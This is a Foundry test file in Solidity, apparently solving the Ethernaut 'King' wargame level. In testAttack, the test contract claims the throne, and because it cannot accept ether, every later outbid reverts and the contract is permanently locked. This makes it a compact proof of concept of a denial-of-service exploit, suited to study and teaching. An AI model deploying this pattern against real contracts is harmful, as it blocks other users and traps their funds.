// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {King} from "../src/King.sol";

contract KingTest is Test {
    King king;

    address alice = makeAddr("alice");
    address chris = makeAddr("chris");
    address sara = makeAddr("sara");

    function sendETH(address _user, uint256 _amount) public {
        vm.prank(_user);
        (bool ok,) = address(king).call{value: _amount}("");
        require(ok, "send ETH failed");
    }

    function setUp() public {
        deal(alice, 1 ether);
        deal(chris, 1 ether);
        deal(sara, 1 ether);

        vm.prank(alice);
        king = new King{value: 0.1 ether}();

        sendETH(chris, 0.2 ether);
    }

    function testAttack() public {
        assertEq(alice.balance, 1.1 ether);

        sendETH(address(this), 0.3 ether);

        vm.expectRevert();
        sendETH(sara, 0.4 ether);

        assertEq(king._king(), address(this));
        assertEq(king.prize(), 0.3 ether);
    }
}
